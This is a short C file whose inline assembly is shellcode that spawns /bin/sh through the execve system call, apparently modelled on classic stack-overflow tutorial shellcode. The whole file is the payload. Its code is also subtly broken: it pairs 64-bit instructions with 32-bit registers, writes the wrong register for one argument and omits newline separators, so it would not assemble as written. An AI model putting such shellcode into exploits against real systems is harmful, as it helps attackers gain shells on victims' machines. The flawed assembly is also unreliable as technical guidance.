/* shellcodeasm.c */

void main() {
__asm__(
      "jmpq       0x15                # 2 bytes"
      "popq       %esi                # 1 byte"
      "movq       %esi, 0x8(%esi)     # 3 bytes"
      "movq       $0x0, 0x7(%esi)     # 4 bytes"
      "movq       $0x0, 0xc(%esi)     # 7 bytes"
      "movq       $0xb, %eax          # 5 bytes"
      "movq       %esi, %ebx          # 2 bytes"
      "leaq       0x8(%esi), %ecx     # 3 bytes"
      "leaq       0xc(%esi), %ebx     # 5 bytes"
      "int        $0x80               # 2 bytes"
      "call       -0x3e               # 5 bytes"
      ".string    \"/bin/sh\"         # 8 bytes"
);
}
